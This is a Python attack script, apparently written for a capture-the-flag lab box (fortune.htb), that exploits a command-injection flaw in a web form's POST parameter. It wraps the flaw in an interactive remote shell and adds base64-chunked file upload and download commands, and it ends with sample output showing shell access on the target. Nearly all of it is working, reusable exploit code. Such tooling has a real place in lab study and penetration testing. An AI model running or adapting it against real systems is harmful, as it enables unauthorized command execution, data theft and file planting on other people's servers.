#!/usr/bin/env python
from __future__ import print_function
# Author: Alamot
# Status: WIP (Work In Progress)
#
# Define a variable rce like this:
# rce = {"method":"POST",
#        "url":"http://10.10.10.127/select",
#        "data":"db=fortunes2%7C__RCE__%20%23",
#        "remote_os":"unix",
#        "timeout":30}
#
# Use __RCE__ to mark the command injection point.
#
# To upload a file type: UPLOAD local_path remote_path
# e.g. UPLOAD myfile.txt /tmp/myfile.txt
# If you omit the remote_path it uploads the file on the current working folder.
#
# To download a file: DOWNLOAD remote_path
# e.g. $ DOWNLOAD /temp/myfile.txt


import os
import re
import sys
import uuid
import copy
import tqdm
import shlex
import base64
import hashlib
import requests
try:
    # Python 2.X
    from urllib import quote
    input = raw_input
except ImportError:
    from urllib.parse import quote  # Python 3+


DEBUG = False
BUFFER_SIZE = 5000
# Redirect stderr to stdout?
ERR2OUT = True
# A unique sequence of characters that marks start/end of output.
UNIQUE_SEQ = uuid.uuid4().hex[0:6]
UNIX_TOOLS = {"b64enc": {"base64":"base64",
                         "openssl":"openssl base64 -A"},
              "b64dec": {"base64":"base64 -d",
                         "openssl":"openssl base64 -A -d",
                         "python":"python -m base64 -d"},
              "md5sum": {"md5sum":"md5sum",
                         "md5":"md5 -q"}}


def memoize(function):
  memo = {}
  def wrapper(*args):
    if args in memo:
      return memo[args]
    else:
      rv = function(*args)
      memo[args] = rv
      return rv
  return wrapper


def send_command(command, rce, enclose=False):
    try:
        client = requests.session()
        client.verify = False
        client.keep_alive = False
        if enclose:
            cmd = "echo " + UNIQUE_SEQ + ";" + command + ";echo " + UNIQUE_SEQ
        else:
            cmd = command
        if DEBUG: print(cmd)
        if rce["method"] == "GET":
            response = client.get(url, timeout=rce["timeout"])
        elif rce["method"] == "POST":
            data = rce["data"].replace("__RCE__", quote(cmd))
            headers = {"Content-Type":"application/x-www-form-urlencoded"}
            response = client.post(rce["url"], data=data,
                                   headers=headers,
                                   timeout=rce["timeout"])
        if response.status_code != 200:
            print("Status: "+str(response.status_code))
        if DEBUG: print(response.text)
        if enclose:
            return response.text.split(UNIQUE_SEQ)[1]
        else:
            return response
    except requests.exceptions.RequestException as e:
        print(str(e))
    finally:
        if client:
            client.close()


@memoize
def find_tool(tool_type):
    for tool_name in sorted(UNIX_TOOLS[tool_type].keys()):
        cmd = "which " + tool_name + " && echo FOUND || echo FAILED"
        response = send_command(cmd, rce)
        if "FOUND" in response.text:
            return UNIX_TOOLS[tool_type][tool_name]
    return None


def download(rce, remote_path):
    cmd = find_tool("md5sum") + " '" + remote_path + "'"
    response = send_command(cmd, rce, enclose=True)
    remote_md5sum = response.strip()[:32]
    cmd = "cat '" + remote_path + "' | " + find_tool("b64enc")
    b64content = send_command(cmd, rce, enclose=True)
    content = base64.b64decode(b64content)
    local_md5sum = hashlib.md5(content).hexdigest()
    print("Remote md5sum: " + remote_md5sum)
    print(" Local md5sum: " + local_md5sum)
    if  local_md5sum == remote_md5sum:
        print("               MD5 hashes match!")
    else:
        print("               ERROR! MD5 hashes do NOT match!")
    with open(os.path.basename(remote_path), "wb") as f:
        f.write(content)


def upload(rce, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    if rce["remote_os"] == "unix":
        cmd = "> '" + remote_path + ".b64'"
    elif rce["remote_os"] == "windows":
        cmd = 'type nul > "' + remote_path + '.b64"'
    send_command(cmd, rce)

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = base64.b64encode(data).decode('ascii')
   
    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo ' + b64enc_data[i:i+BUFFER_SIZE] + ' >> "' + remote_path + '.b64"'
        send_command(cmd, rce)
    #print("Remaining: "+str(len(b64enc_data)-i))
    
    if rce["remote_os"] == "unix":
        cmd = "cat '" + remote_path + ".b64' | " + find_tool("b64dec") + " > '" + remote_path + "'"
        send_command(cmd, rce)
        cmd = find_tool("md5sum") + " '" + remote_path + "'"
        response = send_command(cmd, rce)
    elif rce["remote_os"] == "windows":
        cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
        send_command(cmd, rce)
        cmd = 'certutil -hashfile "' + remote_path + '" MD5'
        response = send_command(cmd, rce)
    if md5sum in response.text:
        print("               MD5 hashes match: " + md5sum)
    else:
        print("               ERROR! MD5 hashes do NOT match!")


def shell(rce):
    global DEBUG
    stored_cwd = None
    user_input = None
    if rce["remote_os"] == "unix":
        get_info = "whoami;hostname;pwd"
    elif rce["remote_os"] == "windows":
        get_info = 'echo %username%^|%COMPUTERNAME% & cd'
    while True:
        cmd = ""
        if stored_cwd:
            cmd += "cd " + stored_cwd + ";"
        if user_input:
            cmd += user_input
            cmd += " 2>&1;" if ERR2OUT else ";"
        cmd += get_info
        response = send_command(cmd, rce, enclose=True)
        lines = response.splitlines()
        user, host, cwd = lines[-3:]
        stored_cwd = cwd
        for output in lines[1:-3]:
            print(output)
        user_input = input("[" + user + "@" + host + " " + cwd + "]$ ").rstrip("\n")
        if user_input.lower().strip() == "exit":
            return
        elif user_input[:8] == "DEBUG ON":
            DEBUG = True
            user_input = "echo 'DEBUG is now ON'"
        elif user_input[:9] == "DEBUG OFF":
            DEBUG = False
            user_input = "echo 'DEBUG is now OFF'"
        elif user_input[:8] == "DOWNLOAD":
            remote_path = shlex.split(user_input, posix=False)[1]
            if remote_path[0] != '/':
                remote_path = stored_cwd + "/" + remote_path
            download(rce, remote_path)
            user_input = "echo '               *****  DOWNLOAD FINISHED  *****'"
        elif user_input[:6] == "UPLOAD":
            upload_cmd = shlex.split(user_input, posix=False)
            local_path = upload_cmd[1]
            if len(upload_cmd) < 3:
                remote_path = stored_cwd + "/" + os.path.basename(local_path)
                upload(rce, local_path, remote_path)
            else:
                remote_path = upload_cmd[2]
                if remote_path[0] != '/':
                    remote_path = stored_cwd + "/" + remote_path
                upload(rce, local_path, remote_path)
            user_input = "echo '               *****  UPLOAD FINISHED  *****'"


rce = {"method":"POST",
       "url":"http://10.10.10.127/select",
       "data":"db=fortunes2%7C__RCE__%20%23",
       "remote_os":"unix",
       "timeout":30}

shell(rce=rce)
sys.exit()


'''
EXAMPLE:
$ python rce2shell.py 
[_fortune@fortune.htb /var/appsrv/fortune]$ ls -al
total 104
drwxr-xr-x  4 _fortune  _fortune    512 Feb  3 05:08 .
drwxr-xr-x  5 root      wheel       512 Nov  2  2018 ..
drwxrwxrwx  2 _fortune  _fortune    512 Nov  2  2018 __pycache__
-rw-r--r--  1 root      _fortune    341 Nov  2  2018 fortuned.ini
-rw-r-----  1 _fortune  _fortune  35638 Aug  3 06:00 fortuned.log
-rw-rw-rw-  1 _fortune  _fortune      6 Aug  3 03:13 fortuned.pid
-rw-r--r--  1 root      _fortune    413 Nov  2  2018 fortuned.py
drwxr-xr-x  2 root      _fortune    512 Nov  2  2018 templates
-rw-r--r--  1 root      _fortune     67 Nov  2  2018 wsgi.py
'''
